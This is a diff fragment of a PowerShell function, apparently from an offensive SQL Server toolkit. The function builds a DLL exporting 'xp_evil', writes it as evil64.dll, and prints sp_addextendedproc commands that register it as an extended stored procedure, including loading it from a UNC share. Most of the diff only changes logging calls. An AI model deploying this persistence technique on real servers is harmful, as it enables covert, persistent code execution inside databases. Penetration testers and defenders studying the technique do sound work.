@@ -119,7 +119,7 @@ function Invoke-SqlServer-Persist-Xp2
             throw("Could not find string $BufferString !")
             Break
         }else{
-            write-output "[*] Found buffer offset for command: $Index" 
+            Write-Verbose "[*] Found buffer offset for command: $Index" 
         }
 
         # Replace target bytes
@@ -136,7 +136,7 @@ function Invoke-SqlServer-Persist-Xp2
         # Set default dll name
         IF(-not($ExportName)){
             $ExportName = "xp_evil"
-        }
+        }        
 
         # Check function name length
         $ProcNameBufferLen = $ProcNameBuffer.Length
@@ -164,7 +164,7 @@ function Invoke-SqlServer-Persist-Xp2
             throw("Could not find string $ProcNameBuffer!")
             Break
         }else{
-            write-output "[*] Found buffer offset for function name: $ProcIndex" 
+            Write-Verbose "[*] Found buffer offset for function name: $ProcIndex" 
         }
 
         # Convert function name to bytes
@@ -179,7 +179,7 @@ function Invoke-SqlServer-Persist-Xp2
 
         # Get offset for nulls
         $NullOffset = $ProcIndex+$ExportNameLen
-        write-output "[*] Found buffer offset for buffer: $NullOffset"        
+        Write-Verbose "[*] Found buffer offset for buffer: $NullOffset"        
         $NullBytes = ([system.Text.Encoding]::UTF8).GetBytes($ProcNewBuffer) # this needs to be fill with null bytes or vull
         
         # Replace target bytes         
@@ -192,9 +192,15 @@ function Invoke-SqlServer-Persist-Xp2
         # Write DLL file to disk
         # ------------------------------------
 
+        Write-Output "[*] Creating DLL containing exported function named $ExportName..."
+
         IF(-not($OutFile)){
             $OutFile = ".\evil64.dll"
         }
         Set-Content -Value $DllBytes -Encoding Byte -Path $OutFile
-        write-output "[*] DLL written to: $OutFile"
+        Write-Output "[*] DLL written to: $OutFile"
+        Write-Output "[*] SQL Server TSQL options to register stored procedure on <= v2016:"
+        Write-Output "[*] sp_addextendedproc `'$ExportName`', `'c:\pathtofile\$OutFile`'"
+	    Write-Output "[*] sp_addextendedproc `'$ExportName`', `'\\127.0.0.1\C$\Temp\$OutFile`'"
+
 }
